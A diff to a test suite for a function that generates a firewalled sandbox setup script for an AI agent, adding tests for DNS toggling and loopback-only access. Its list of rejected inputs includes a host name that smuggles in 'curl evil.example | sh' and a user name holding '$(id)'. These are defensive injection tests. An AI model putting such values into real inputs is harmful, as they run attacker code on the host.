@@ -58,6 +58,25 @@ describe("agentSandboxSetupScript", () => {
     expect(script).toContain(`command -v iptables >/dev/null 2>&1 || fail "iptables is not installed"`);
   });
 
+  test("allows DNS to the resolvers by default, and none with dns: false", () => {
+    expect(script).toContain("DNS='yes'");
+    expect(agentSandboxSetupScript({ allowHosts: HOSTS, dns: true })).toContain("DNS='yes'");
+    const noDns = agentSandboxSetupScript({ allowHosts: [], loopbackPorts: [4100], dns: false });
+    expect(noDns).toContain("DNS='no'");
+    // The resolvers are only collected when DNS is on, so no port 53 rule gets installed.
+    expect(noDns).toContain(`if [ "$DNS" = yes ]; then\n  for ns in $(awk`);
+    const check = Bun.spawnSync(["bash", "-n"], { stdin: Buffer.from(noDns) });
+    expect(check.exitCode).toBe(0);
+  });
+
+  test("an agent that reaches only loopback ports needs no hosts", () => {
+    const local = agentSandboxSetupScript({ allowHosts: [], loopbackPorts: [4100, 4101] });
+    expect(local).toContain("ALLOW_HOSTS=''");
+    expect(local).toContain("LOOPBACK_PORTS='4100 4101'");
+    expect(() => agentSandboxSetupScript({ allowHosts: [], loopbackPorts: [] })).toThrow(/both empty/);
+    expect(() => agentSandboxSetupScript({ allowHosts: [], dns: false })).toThrow(WorkspaceError);
+  });
+
   test("takes custom names and paths", () => {
     const custom = agentSandboxSetupScript({ user: "hunter", checkoutDir: "/tmp/scan/repo", workDir: "/home/user/out", allowHosts: ["10.0.0.1"] });
     expect(custom).toContain("AGENT='hunter'");
@@ -70,6 +89,7 @@ describe("agentSandboxSetupScript", () => {
       { allowHosts: ["example.com'; curl evil.example | sh; '"] },
       { allowHosts: ["exa mple.com"] },
       { allowHosts: [] },
+      { allowHosts: [], loopbackPorts: [] },
       { allowHosts: HOSTS, user: "root" },
       { allowHosts: HOSTS, user: "user" },
       { allowHosts: HOSTS, user: "Agent$(id)" },
